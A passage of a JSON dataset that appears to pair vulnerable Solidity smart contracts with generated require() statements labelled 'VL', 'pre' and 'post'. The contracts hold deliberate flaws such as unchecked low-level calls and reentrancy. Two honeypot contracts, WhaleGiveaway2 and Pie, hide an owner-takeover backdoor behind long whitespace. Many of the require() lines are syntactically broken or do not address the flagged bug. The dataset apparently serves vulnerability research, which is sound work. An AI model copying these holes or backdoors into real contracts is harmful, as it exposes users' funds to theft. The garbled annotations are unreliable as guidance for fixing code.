            {
                "VL": [
                    43,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),(address)this)>amount);"
                ],
                "pre": [
                    43,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),(address)this)>amount);"
                ],
                "post": [
                    45,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),to)>0);"
                ]
            }
        ],
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 94\n */\n\npragma solidity ^0.4.19;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[_addr]>0)\n        {\n\n            if(_addr.call.value(_wei)())\n            {\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n}",
            {
                "VL": [
                    93,
                    "require(_wei<=Holders[_addr]);"
                ],
                "pre": [
                    91,
                    "require(_addr!=address(0));"
                ],
                "post": [
                    99,
                    "require(Holders[_addr]>0);"
                ]
            }
        ]
    ],
    "0x9d06cbafa865037a01d322d3f4222fa3e04e5488.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54,65\n */\n\npragma solidity ^0.4.23;        \n\n// ----------------------------------------------------------------------------------------------\n// Project Delta \n// DELTA - New Crypto-Platform with own cryptocurrency, verified smart contracts and multi blockchains!\n// For 1 DELTA token in future you will get 1 DELTA coin!\n// Site: http://delta.money\n// Telegram Chat: @deltacoin\n// Telegram News: @deltaico\n// CEO Nechesov Andrey http://facebook.com/Nechesov     \n// Telegram: @Nechesov\n// Ltd. \"Delta\"\n// Working with ERC20 contract https://etherscan.io/address/0xf85a2e95fa30d005f629cbe6c6d2887d979fff2a                  \n// ----------------------------------------------------------------------------------------------\n   \ncontract Delta {     \n\n\taddress public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A; \n\taddress public owner = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0;\t\n\taddress public owner2 = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3;\t\n\tuint public active = 1;\t\n\n\tuint public token_price = 10**18*1/1000; \t\n\n\t//default function for buy tokens      \n\tfunction() payable {        \n\t    tokens_buy();        \n\t}\n\n\t/**\n\t* Buy tokens\n\t*/\n    function tokens_buy() payable returns (bool) {         \n        \n        require(active > 0);\n        require(msg.value >= token_price);        \n\n        uint tokens_buy = msg.value*10**18/token_price;\n\n        require(tokens_buy > 0);\n\n        if(!c.call(bytes4(sha3(\"transferFrom(address,address,uint256)\")),owner, msg.sender,tokens_buy)){\n        \treturn false;\n        }\n\n        uint sum2 = msg.value * 3 / 10;           \n\n        owner2.send(sum2);\n\n        return true;\n      }     \n\n      //Withdraw money from contract balance to owner\n      function withdraw(uint256 _amount) onlyOwner returns (bool result) {\n          uint256 balance;\n          balance = this.balance;\n          if(_amount > 0) balance = _amount;\n\n          owner.send(balance);\n          return true;\n      }\n\n      //Change token\n      function change_token_price(uint256 _token_price) onlyOwner returns (bool result) {\n        token_price = _token_price;\n        return true;\n      }\n\n      //Change active\n      function change_active(uint256 _active) onlyOwner returns (bool result) {\n        active = _active;\n        return true;\n      }\n\n      // Functions with this modifier can only be executed by the owner\n    \tmodifier onlyOwner() {\n        if (msg.sender != owner) {\n            throw;\n        }\n        _;\n    }        \t\n\n\n}",
            {
                "VL": [
                    53,
                    "require(owner.send(msg.value-sum2));"
                ],
                "pre": [
                    40,
                    "require(msg.sender!=owner);"
                ],
                "post": [
                    57,
                    "require(false);"
                ]
            }
        ],
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54,65\n */\n\npragma solidity ^0.4.23;        \n\n// ----------------------------------------------------------------------------------------------\n// Project Delta \n// DELTA - New Crypto-Platform with own cryptocurrency, verified smart contracts and multi blockchains!\n// For 1 DELTA token in future you will get 1 DELTA coin!\n// Site: http://delta.money\n// Telegram Chat: @deltacoin\n// Telegram News: @deltaico\n// CEO Nechesov Andrey http://facebook.com/Nechesov     \n// Telegram: @Nechesov\n// Ltd. \"Delta\"\n// Working with ERC20 contract https://etherscan.io/address/0xf85a2e95fa30d005f629cbe6c6d2887d979fff2a                  \n// ----------------------------------------------------------------------------------------------\n   \ncontract Delta {     \n\n\taddress public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A; \n\taddress public owner = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0;\t\n\taddress public owner2 = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3;\t\n\tuint public active = 1;\t\n\n\tuint public token_price = 10**18*1/1000; \t\n\n\t//default function for buy tokens      \n\tfunction() payable {        \n\t    tokens_buy();        \n\t}\n\n\t/**\n\t* Buy tokens\n\t*/\n    function tokens_buy() payable returns (bool) {         \n        \n        require(active > 0);\n        require(msg.value >= token_price);        \n\n        uint tokens_buy = msg.value*10**18/token_price;\n\n        require(tokens_buy > 0);\n\n        if(!c.call(bytes4(sha3(\"transferFrom(address,address,uint256)\")),owner, msg.sender,tokens_buy)){\n        \treturn false;\n        }\n\n        uint sum2 = msg.value * 3 / 10;           \n\n        owner2.send(sum2);\n\n        return true;\n      }     \n\n      //Withdraw money from contract balance to owner\n      function withdraw(uint256 _amount) onlyOwner returns (bool result) {\n          uint256 balance;\n          balance = this.balance;\n          if(_amount > 0) balance = _amount;\n\n          owner.send(balance);\n          return true;\n      }\n\n      //Change token\n      function change_token_price(uint256 _token_price) onlyOwner returns (bool result) {\n        token_price = _token_price;\n        return true;\n      }\n\n      //Change active\n      function change_active(uint256 _active) onlyOwner returns (bool result) {\n        active = _active;\n        return true;\n      }\n\n      // Functions with this modifier can only be executed by the owner\n    \tmodifier onlyOwner() {\n        if (msg.sender != owner) {\n            throw;\n        }\n        _;\n    }        \t\n\n\n}",
            {
                "VL": [
                    64,
                    "require(balance>0);"
                ],
                "pre": [
                    61,
                    "require(active>0);"
                ],
                "post": [
                    67,
                    "require(false);"
                ]
            }
        ]
    ],
    "unchecked_return_value.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-104#unchecked-return-valuesol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity 0.4.25;\n\ncontract ReturnValue {\n\n  function callchecked(address callee) public {\n    require(callee.call());\n  }\n\n  function callnotchecked(address callee) public {\n\n    callee.call();\n  }\n}",
            {
                "VL": [
                    16,
                    "require(callee.call.value(1)());"
                ],
                "pre": [
                    16,
                    "require(callee.call.value(1)());"
                ],
                "post": [
                    18,
                    "require(false);"
                ]
            }
        ]
    ],
    "0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway2\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    43,
                    "require(msg.value>0);"
                ],
                "pre": [
                    42,
                    "require(msg.value>0);"
                ],
                "post": [
                    45,
                    "require(adr.balance>=msg.value);"
                ]
            }
        ]
    ],
    "0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 25\n */\n\npragma solidity ^0.4.23;\n\n/*\n!!! THIS CONTRACT IS EXPLOITABLE AND FOR EDUCATIONAL PURPOSES ONLY !!!\n\nThis smart contract allows a user to (insecurely) store funds\nin this smart contract and withdraw them at any later point in time\n*/\n\ncontract keepMyEther {\n    mapping(address => uint256) public balances;\n    \n    function () payable public {\n        balances[msg.sender] += msg.value;\n    }\n    \n    function withdraw() public {\n\n        msg.sender.call.value(balances[msg.sender])();\n        balances[msg.sender] = 0;\n    }\n}",
            {
                "VL": [
                    24,
                    "require(balances[msg.sender]>0);"
                ],
                "pre": [
                    24,
                    "require(balances[msg.sender]>0);"
                ],
                "post": [
                    27,
                    "require(msg.sender.call.value(balances[msg.sender])());"
                ]
            }
        ]
    ],
    "0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Pie\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function Get()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    43,
                    "require(msg.value>0);"
                ],
                "pre": [
                    42,
                    "require(msg.value>0);"
                ],
                "post": [
                    45,
                    "require(adr.balance>=msg.value);"
                ]
            }
        ]
    ],
    "0xf2570186500a46986f3139f65afedc2afe4f445d.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 18\n */\n\npragma solidity ^0.4.16;\n\ncontract RealOldFuckMaker {\n    address fuck = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D;\n    \n    // this can make OVER 9,000 OLD FUCKS\n    // (just pass in 129)\n    function makeOldFucks(uint32 number) {\n        uint32 i;\n        for (i = 0; i < number; i++) {\n\n            fuck.call(bytes4(sha3(\"giveBlockReward()\")));\n        }\n    }\n}",
            {
                "VL": [
                    17,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    15,
                    "require(number<=129);"
                ],
                "post": [
                    20,
                    "require(fuck.call(bytes4(sha3(\"giveBlockReward()\"))));"
                ]
            }
        ]
    ],
    "0xec329ffc97d75fe03428ae155fc7793431487f63.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 30\n */\n\npragma solidity ^0.4.11; /* originally >=0.4.11 */\n\ncontract Owned {\n    function Owned() {\n        owner = msg.sender;\n    }\n\n    address public owner;\n\n    // This contract only defines a modifier and a few useful functions\n    // The function body is inserted where the special symbol \"_\" in the\n    // definition of a modifier appears.\n    modifier onlyOwner { if (msg.sender == owner) _; }\n\n    function changeOwner(address _newOwner) onlyOwner {\n        owner = _newOwner;\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function execute(address _dst, uint _value, bytes _data) onlyOwner {\n\n        _dst.call.value(_value)(_data);\n    }\n}\n// to get the needed token functions in the contract\ncontract Token {\n    function transfer(address, uint) returns(bool);\n    function balanceOf(address) constant returns (uint);\n}\n\ncontract TokenSender is Owned {\n    Token public token; // the token we are working with\n    uint public totalToDistribute;\n\n    uint public next;\n\n\n    struct Transfer {\n        address addr;\n        uint amount;\n    }\n\n    Transfer[] public transfers;\n\n    function TokenSender(address _token) {\n        token = Token(_token);\n    }\n\n    // this is a used to save gas\n    uint constant D160 = 0x0010000000000000000000000000000000000000000;\n\n    // This is the function that makes the list of transfers and various\n    //  checks around that list, it is a little tricky, the data input is\n    //  structured with the `amount` and the (receiving) `addr` combined as one\n    //  long number and then this number is deconstructed in this function to\n    //  save gas and reduce the number of `0`'s that are needed to be stored\n    //   on the blockchain\n    function fill(uint[] data) onlyOwner {\n\n        // If the send has started then we just throw\n        if (next>0) throw;\n\n        uint acc;\n        uint offset = transfers.length;\n        transfers.length = transfers.length + data.length;\n        for (uint i = 0; i < data.length; i++ ) {\n            address addr = address( data[i] & (D160-1) );\n            uint amount = data[i] / D160;\n\n            transfers[offset + i].addr = addr;\n            transfers[offset + i].amount = amount;\n            acc += amount;\n        }\n        totalToDistribute += acc;\n    }\n    // This function actually makes the sends and tracks the amount of gas used\n    //  if it takes more gas than was sent with the transaction then this\n    //  function will need to be called a few times until\n    function run() onlyOwner {\n        if (transfers.length == 0) return;\n\n        // Keep next in the stack var mNext to save gas\n        uint mNext = next;\n\n        // Set the contract as finalized to avoid reentrance\n        next = transfers.length;\n\n        if ((mNext == 0 ) && ( token.balanceOf(this) != totalToDistribute)) throw;\n\n        while ((mNext<transfers.length) && ( gas() > 150000 )) {\n            uint amount = transfers[mNext].amount;\n            address addr = transfers[mNext].addr;\n            if (amount > 0) {\n                if (!token.transfer(addr, transfers[mNext].amount)) throw;\n            }\n            mNext ++;\n        }\n\n        // Set the next to the actual state.\n        next = mNext;\n    }\n\n\n    ///////////////////////\n    // Helper functions\n    ///////////////////////\n\n    function hasTerminated() constant returns (bool) {\n        if (transfers.length == 0) return false;\n        if (next < transfers.length) return false;\n        return true;\n    }\n\n    function nTransfers() constant returns (uint) {\n        return transfers.length;\n    }\n\n    function gas() internal constant returns (uint _gas) {\n        assembly {\n            _gas:= gas\n        }\n    }\n\n}",
            {
                "VL": [
                    29,
                    "require(_dst.call.value(_value)(_data));"
                ],
                "pre": [
                    29,
                    "require(_dst.call.value(_value)(_data));"
                ],
                "post": [
                    31,
                    "require(hasTerminated());"
                ]
            }
        ]
    ],
    "0x610495793564aed0f9c7fc48dc4c7c9151d34fd6.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 33\n */\n\npragma solidity ^0.4.24;\n\n\ncontract SimpleWallet {\n    address public owner = msg.sender;\n    uint public depositsCount;\n    \n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    function() public payable {\n        depositsCount++;\n    }\n    \n    function withdrawAll() public onlyOwner {\n        withdraw(address(this).balance);\n    }\n    \n    function withdraw(uint _value) public onlyOwner {\n        msg.sender.transfer(_value);\n    }\n    \n    function sendMoney(address _target, uint _value, bytes _data) public onlyOwner {\n\n        _target.call.value(_value)(_data);\n    }\n}",
            {
                "VL": [
                    32,
                    "require(_target.call.value(_value)(_data).gas.value(_value));"
                ],
                "pre": [
                    32,
                    "require(_target.call.value(_value)(_data).gas.value(_value));"
                ],
                "post": [
                    34,
                    "require(_target.balance>=_value);"
                ]
            }
        ]
    ],
    "0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>=MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n    function Bal() public constant returns(uint){return this.balance;}\n}",
            {
                "VL": [
                    43,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),(address)this)>=amount));"
                ],
                "pre": [
                    43,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),(address)this)>=amount));"
                ],
                "post": [
                    45,
                    "require(token.call(bytes4(sha3(\"balanceOf(address)\")),to)>0);"
                ]
            }
        ],
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>=MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n    function Bal() public constant returns(uint){return this.balance;}\n}",
            {
                "VL": [
                    96,
                    "require(_addr.send(_wei));"
                ],
                "pre": [
                    92,
                    "require(_addr!=0x0);"
                ],
                "post": [
                    101,
                    "require(Holders[msg.sender]>=_wei);"
                ]
            }
        ]
    ],
    "0xf29ebe930a539a60279ace72c707cba851a57707.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.24;\n\n\ncontract B {\n    address public owner = msg.sender;\n    \n    function go() public payable {\n        address target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;\n\n        target.call.value(msg.value)();\n        owner.transfer(address(this).balance);\n    }\n    \n    function() public payable {\n    }\n}",
            {
                "VL": [
                    15,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    14,
                    "require(msg.value>=1000000000000000000);"
                ],
                "post": [
                    18,
                    "require(false);"
                ]
            }
        ]
    ],
    "king_of_the_ether_throne.sol": [
        [
            "/*\n * @source: https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol\n * @author: -\n * @vulnerable_at_lines: 110,118,132,174\n */\n\n// A chain-game contract that maintains a 'throne' which agents may pay to rule.\n// See www.kingoftheether.com & https://github.com/kieranelby/KingOfTheEtherThrone .\n// (c) Kieran Elby 2016. All rights reserved.\n// v0.4.0.\n// Inspired by ethereumpyramid.com and the (now-gone?) \"magnificent bitcoin gem\".\n\n// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0\n// and was compiled (using optimization) with:\n// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum\n\n// For future versions it would be nice to ...\n// TODO - enforce time-limit on reign (can contracts do that without external action)?\n// TODO - add a random reset?\n// TODO - add bitcoin bridge so agents can pay in bitcoin?\n// TODO - maybe allow different return payment address?\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract KingOfTheEtherThrone {\n\n    struct Monarch {\n        // Address to which their compensation will be sent.\n        address etherAddress;\n        // A name by which they wish to be known.\n        // NB: Unfortunately \"string\" seems to expose some bugs in web3.\n        string name;\n        // How much did they pay to become monarch?\n        uint claimPrice;\n        // When did their rule start (based on block.timestamp)?\n        uint coronationTimestamp;\n    }\n\n    // The wizard is the hidden power behind the throne; they\n    // occupy the throne during gaps in succession and collect fees.\n    address wizardAddress;\n\n    // Used to ensure only the wizard can do some things.\n    modifier onlywizard { if (msg.sender == wizardAddress) _; }\n\n    // How much must the first monarch pay?\n    uint constant startingClaimPrice = 100 finney;\n\n    // The next claimPrice is calculated from the previous claimFee\n    // by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -\n    // for example, num=3 and den=2 would cause a 50% increase.\n    uint constant claimPriceAdjustNum = 3;\n    uint constant claimPriceAdjustDen = 2;\n\n    // How much of each claimFee goes to the wizard (expressed as a fraction)?\n    // e.g. num=1 and den=100 would deduct 1% for the wizard, leaving 99% as\n    // the compensation fee for the usurped monarch.\n    uint constant wizardCommissionFractionNum = 1;\n    uint constant wizardCommissionFractionDen = 100;\n\n    // How much must an agent pay now to become the monarch?\n    uint public currentClaimPrice;\n\n    // The King (or Queen) of the Ether.\n    Monarch public currentMonarch;\n\n    // Earliest-first list of previous throne holders.\n    Monarch[] public pastMonarchs;\n\n    // Create a new throne, with the creator as wizard and first ruler.\n    // Sets up some hopefully sensible defaults.\n    function KingOfTheEtherThrone() {\n        wizardAddress = msg.sender;\n        currentClaimPrice = startingClaimPrice;\n        currentMonarch = Monarch(\n            wizardAddress,\n            \"[Vacant]\",\n            0,\n            block.timestamp\n        );\n    }\n\n    function numberOfMonarchs() constant returns (uint n) {\n        return pastMonarchs.length;\n    }\n\n    // Fired when the throne is claimed.\n    // In theory can be used to help build a front-end.\n    event ThroneClaimed(\n        address usurperEtherAddress,\n        string usurperName,\n        uint newClaimPrice\n    );\n\n    // Fallback function - simple transactions trigger this.\n    // Assume the message data is their desired name.\n    function() {\n        claimThrone(string(msg.data));\n    }\n\n    // Claim the throne for the given name by paying the currentClaimFee.\n    function claimThrone(string name) {\n\n        uint valuePaid = msg.value;\n\n        // If they paid too little, reject claim and refund their money.\n        if (valuePaid < currentClaimPrice) {\n\n            msg.sender.send(valuePaid);\n            return;\n        }\n\n        // If they paid too much, continue with claim but refund the excess.\n        if (valuePaid > currentClaimPrice) {\n            uint excessPaid = valuePaid - currentClaimPrice;\n\n            msg.sender.send(excessPaid);\n            valuePaid = valuePaid - excessPaid;\n        }\n\n        // The claim price payment goes to the current monarch as compensation\n        // (with a commission held back for the wizard). We let the wizard's\n        // payments accumulate to avoid wasting gas sending small fees.\n\n        uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;\n\n        uint compensation = valuePaid - wizardCommission;\n\n        if (currentMonarch.etherAddress != wizardAddress) {\n\n            currentMonarch.etherAddress.send(compensation);\n        } else {\n            // When the throne is vacant, the fee accumulates for the wizard.\n        }\n\n        // Usurp the current monarch, replacing them with the new one.\n        pastMonarchs.push(currentMonarch);\n        currentMonarch = Monarch(\n            msg.sender,\n            name,\n            valuePaid,\n            block.timestamp\n        );\n\n        // Increase the claim fee for next time.\n        // Stop number of trailing decimals getting silly - we round it a bit.\n        uint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;\n        if (rawNewClaimPrice < 10 finney) {\n            currentClaimPrice = rawNewClaimPrice;\n        } else if (rawNewClaimPrice < 100 finney) {\n            currentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);\n        } else if (rawNewClaimPrice < 1 ether) {\n            currentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);\n        } else if (rawNewClaimPrice < 10 ether) {\n            currentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);\n        } else if (rawNewClaimPrice < 100 ether) {\n            currentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);\n        } else if (rawNewClaimPrice < 1000 ether) {\n            currentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);\n        } else if (rawNewClaimPrice < 10000 ether) {\n            currentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);\n        } else {\n            currentClaimPrice = rawNewClaimPrice;\n        }\n\n        // Hail the new monarch!\n        ThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function sweepCommission(uint amount) onlywizard {\n\n        wizardAddress.send(amount);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function transferOwnership(address newOwner) onlywizard {\n        wizardAddress = newOwner;\n    }\n\n}",
            {
                "VL": [
                    109,
                    "require((valuePaid<currentClaimPrice)||(valuePaid==0)) {\n            ThroneClaimed(0,\"[Rejected]\",currentClaimPrice));"
                ],
                "pre": [
                    104,
                    "require(claimThrone(string name) {\n\n        // If the throne is already occupied, reject claim and refund their money.\n        if (currentMonarch.etherAddress!=wizardAddress) {\n\n            msg.sender.send(msg.value);\n            return;\n        }\n\n        // If the throne is vacant, allow them to claim it for free.\n        if(currentMonarch.etherAddress==wizardAddress&&currentMonarch.claimPrice==0) {\n\n            currentMonarch=Monarch(msg.sender,name,0,block.timestamp);\n            ThroneClaimed(currentMonarch.etherAddress,currentMonarch.name,currentClaimPrice);\n            return;\n        }\n\n        // If the throne is vacant, allow them to claim it for free.\n        if(currentMonarch.etherAddress==wizardAddress&&currentMonarch.claimPrice==0) {\n\n            currentMonarch=Monarch(msg.sender,name,0,block.timestamp);\n            ThroneClaimed(currentMonarch.etherAddress,currentMonarch.name,currentClaimPrice);"
                ],
                "post": [
                    169,
                    "require(arch.name,currentClaimPrice));"
                ]
            }
        ],
        [
